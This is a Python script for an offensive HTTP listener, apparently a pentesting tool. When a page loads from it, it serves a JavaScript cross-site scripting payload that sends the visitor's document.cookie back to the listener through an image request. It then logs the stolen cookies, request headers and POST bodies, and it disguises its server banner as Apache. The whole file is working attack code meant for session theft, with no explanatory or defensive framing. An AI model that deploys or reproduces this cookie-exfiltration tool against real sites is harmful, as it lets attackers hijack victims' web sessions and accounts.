#!/usr/bin/python3
import os
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
from http.cookies import SimpleCookie

# Global variables
timeout = 5
server_token = "Apache"

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

def printCookie(cookie):
    print("Cookies:")
    for key,morsel in cookie.items():
        print(morsel.key + "=" + morsel.value)

def js_code(host,port):
    js = ('''
function doCookie() {
    var img = document.createElement('img');
    img.src = 'http://''' + host + ''':''' + str(port) + '''/' + document.cookie;
    document.body.appendChild(img);
}
doCookie();
    ''')
    return js

class serveHTTP(BaseHTTPRequestHandler):
    def do_GET(s):
        host = s.server.socket.getsockname()[0]
        port = s.server.socket.getsockname()[1]
        all_cookies = SimpleCookie(s.headers.get('Cookie'))
        s.server_version = server_token
        s.sys_version = ''
        s.send_response(200)
        s.send_header("Access-Control-Allow-Origin","*")
        s.end_headers()
        print("\n[*] GET:\nPath: " + str(s.path) + "\nHeaders:\n" + str(s.headers))
        printCookie(all_cookies)
        payload = js_code(host,port)
        s.wfile.write(payload.encode())

    def do_POST(s):
        host = s.server.socket.getsockname()[0]
        port = s.server.socket.getsockname()[1]
        all_cookies = SimpleCookie(s.headers.get('Cookie'))
        s.server_version = server_token
        s.sys_version = ''
        s.send_response(200)
        s.send_header("Access-Control-Allow-Origin","*")
        s.end_headers()
        if s.headers['Content-Length']:
            length = int(s.headers['Content-Length'])
            postVar = s.rfile.read(length)
            print("\n[*] POST:\nPath: " + str(s.path) + "\nHeaders:\n" + str(s.headers) + "Params:\n" +  postVar.decode() + "\n")
        else:
            print("\n[*] POST:\nPath: " + str(s.path) + "\nHeaders:\n" + str(s.headers) + "\n")
        printCookie(all_cookies)

# Main
def main(argv):
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    else:
        print("[*] Usage: " + sys.argv[0] + " <listen_host> <listen_port>\n")
        exit(0)

    server_class = HTTPServer
    httpd = server_class((host, port), serveHTTP)

    # Do stuff
    try:
        print("[*] Accepting HTTP connections on host " + host + " port " + str(port) + "...")
        httpd.serve_forever()
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
